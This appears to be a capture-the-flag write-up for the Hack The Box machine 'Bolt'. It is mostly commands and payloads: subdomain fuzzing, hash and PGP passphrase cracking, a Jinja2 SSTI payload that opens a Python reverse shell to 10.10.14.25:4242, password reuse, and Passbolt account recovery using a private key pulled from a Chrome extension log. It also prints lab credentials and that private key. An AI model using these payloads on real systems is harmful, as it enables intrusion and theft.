![BOLT](banner.png)

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)

```
## Foothold

We started to make it a routine to look for subdomains first:
```sh
└─$ ffuf -w Desktop/Scripts/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://bolt.htb/ -H 'Host: FUZZ.bolt.htb' -fw 10870

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://bolt.htb/
 :: Wordlist         : FUZZ: Desktop/Scripts/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.bolt.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 10870
________________________________________________

demo                    [Status: 302, Size: 219, Words: 22, Lines: 4]
mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]
```

So we have two subdomains :

mail.bolt.htb 

![mail.png](mail.png)

demo.bolt.htb 

![demo.png](demo.png)

Checking port 443 reveals another subdomain in it's certificate:
`+ Hostname 'bolt.htb' does not match certificate's names: passbolt.bolt.htb`

We can't seem to register a new user on any of these subdomains, however we could register a new user on `demo.bolt.htb` if we had an invite code.
Let's have a look at the webpage, we can download an `image.tar`.

running `strings -n 5 image.tar | grep admin` reveals a hash already that can easily be cracked with rockyou and hashcat:

`hashcat -m 500 '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' ~/Desktop/Scripts/wordlists/rockyou.txt`
creds are `admin:deadbolt`

So we found some credentials which can be used to login on `bolt.htb`. This seemed to be a rabbit hole so we continued to have a look at the `image.tar` again:

Extracting the image.tar we can find the invite code needed for the demo.bolt.htb in this file: `/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py`
The code is `XNSS-HSJW-3NGU-8XTJ`.

We can now register a new user at `demo.bolt.htb` and login.
This user is also allowed to login on `mail.bolt.htb`.

## User

Since this is Jinja and HTB we expected to find a [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) somewhere. Most of the textboxes are just templates that can't really be interacted with. However we found out, that if we changed our Name on the admin portal on `demo.bolt.htb` we get a mail with a link to confirm these changes and after confirmation another mail with the new name. So essentially we have an input that get's send back to us. Let's try some basic SSTI:

So this is where you can change your Name:
![name.png](name.png)

First try changing the Name to `{{config.items()}}`

![ssti_confirmed.png](ssti_confirmed.png)

Let's try some RCE `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can use this payload for a reverseshell:

```js
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.25\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```
which we found on [this blog](https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6).

Enumerating the system we found an interesting file `/etc/passbolt/passbolt.php`:
 
```php
    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
```

The user eddie seemed to reuse this password so we can just `su eddie` with the password `rT2;jW7<eY8!dX8}pQ8%` and retrieve the user flag.

## Root

For easier access we just ssh into eddie.
Since the creds we used are ment for mysql let's have a look at that first.

```sql
$ mysql -upassbolt passboltdb -p'rT2;jW7<eY8!dX8}pQ8%'

select * from users;

id      role_id username        active  deleted created modified
4e184ee6-e436-47fb-91c9-dccb57f250bc    1cfcd300-0664-407e-85e6-c11664a7d86c    eddie@bolt.htb  1       0       2021-02-25 21:42:50    2021-02-25 21:55:06
9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    975b9a56-b1b1-453c-9362-c238a85dad76    clark@bolt.htb  1       0       2021-02-25 21:40:29    2021-02-25 21:42:32

select * from authentication_tokens;

id      token   user_id active  created modified        type    data
015b22eb-694f-4c94-a97d-0c87d69017ed    a7b19b6b-9f7f-482b-b677-b284ad5d6a29    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 22:31:57     2021-02-25 22:31:58     login   NULL
463f2e84-1f36-4e2f-ac0d-0010b96edee3    f861c953-aac8-4902-88da-5d17aca0ffde    9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    0       2021-02-25 21:41:46     2021-02-25 21:41:47     login   NULL
57bb11fb-01e5-413c-9442-1d9bc480dbfb    cb900e0b-c602-4da7-acb6-f1daec248836    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 21:49:38     2021-02-25 21:49:39     login   NULL
5bb9d763-c95c-4986-9119-542133e3279c    5779bcad-2c17-487c-bf01-8168a3b20393    9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    0       2021-02-25 21:40:29     2021-02-25 21:41:14     register  NULL
feb08771-2e55-43d8-92bc-d4a34d403273    8c7d2952-1598-420d-a666-fdece8f02bfc    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 21:42:50     2021-02-25 21:49:38     register  NULL
```

These tokens looked really interesting so we did some google-fu and it seems like we should be able to start an account recovery with them.
Following [this forum thread](https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/a42a1eeb-509e-4cb2-9877-6159ef4d6aa2) we can start it using this format:

`https://<your_domain>/setup/recover/<user_id>/<authentication_token.token>`

To get a recover token we first need to request one by putting in eddies mail (`eddie@bolt.htb`) on `https://passbolt.bolt.htb`.
Requesting the authentication tokens from mysql now displays the new ones. In this output we did it for eddie and clark but clarks was not needed later:

```
id      token   user_id active  created modified        type    data
015b22eb-694f-4c94-a97d-0c87d69017ed    a7b19b6b-9f7f-482b-b677-b284ad5d6a29    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 22:31:57     2021-02-25 22:31:58     login   NULL
01f0bfe8-d469-430b-9d88-3a0ee3663425    c8e03570-71bf-4989-8096-cbbafe06065a    9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    1       2021-09-26 21:48:41     2021-09-26 21:48:41     recover NULL
463f2e84-1f36-4e2f-ac0d-0010b96edee3    f861c953-aac8-4902-88da-5d17aca0ffde    9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    0       2021-02-25 21:41:46     2021-02-25 21:41:47     login   NULL
57bb11fb-01e5-413c-9442-1d9bc480dbfb    cb900e0b-c602-4da7-acb6-f1daec248836    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 21:49:38     2021-02-25 21:49:39     login   NULL
5bb9d763-c95c-4986-9119-542133e3279c    5779bcad-2c17-487c-bf01-8168a3b20393    9d8a0452-53dc-4640-b3a7-9a3d86b0ff90    0       2021-02-25 21:40:29     2021-02-25 21:41:14     register  NULL
8157bd88-f0f4-463e-94d2-e61afdd1dc67    a42a1eeb-509e-4cb2-9877-6159ef4d6aa2    4e184ee6-e436-47fb-91c9-dccb57f250bc    1       2021-09-26 21:48:28     2021-09-26 21:48:28     recover NULL
feb08771-2e55-43d8-92bc-d4a34d403273    8c7d2952-1598-420d-a666-fdece8f02bfc    4e184ee6-e436-47fb-91c9-dccb57f250bc    0       2021-02-25 21:42:50     2021-02-25 21:49:38     register  NULL
```

We know `4e184ee6-e436-47fb-91c9-dccb57f250bc` is eddies user_id from the `users` table. So `8c7d2952-1598-420d-a666-fdece8f02bfc` is his recover token.

So this is our request:
`https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/8c7d2952-1598-420d-a666-fdece8f02bfc`

In the next step to recover his account we need his private key. You can't recreate the private key and it isn't saved on the passbolt server either so the only way to find it would be a personal backup somewhere or saved in his google-chrome extension.

Linpeas and [this forum thread](https://community.passbolt.com/t/recover-private-key-from-disk-image/1412/2) helped to find the file we were looking for:

`/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log`

We can extract his private key from it, you only need to get rid of some special characters and linebreaks:
```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

After that we need the passphrase, we can retrieve it from the private key by attacking it with john the ripper:
First do gpg2john, then run:

```bash
└─$ john --wordlist=~/Desktop/Scripts/wordlists/rockyou.txt --format=gpg eddie2john.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:13 0.04% (ETA: 2021-09-29 03:07) 0g/s 97.74p/s 97.74c/s 97.74C/s smartie..patricia1
0g 0:00:01:20 0.04% (ETA: 2021-09-29 03:03) 0g/s 97.69p/s 97.69c/s 97.69C/s pop123..lisamarie
0g 0:00:02:06 0.07% (ETA: 2021-09-29 03:27) 0g/s 96.30p/s 96.30c/s 96.30C/s 112112..twiztid
0g 0:00:05:34 0.18% (ETA: 2021-09-29 04:24) 0g/s 94.60p/s 94.60c/s 94.60C/s daddyy..cool10
0g 0:00:05:36 0.18% (ETA: 2021-09-29 04:24) 0g/s 94.60p/s 94.60c/s 94.60C/s 121583..120680
0g 0:00:05:37 0.18% (ETA: 2021-09-29 04:25) 0g/s 94.61p/s 94.61c/s 94.61C/s twenty20..titita
0g 0:00:05:38 0.18% (ETA: 2021-09-29 04:25) 0g/s 94.58p/s 94.58c/s 94.58C/s preeti..peterbilt
merrychristmas   (Eddie Johnson)
1g 0:00:07:34 DONE (2021-09-27 01:40) 0.002197g/s 94.17p/s 94.17c/s 94.17C/s mhines..megan5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So the passphrase is `merrychristmas`.

Logged in we can just open the root password. ![root.png](root.png).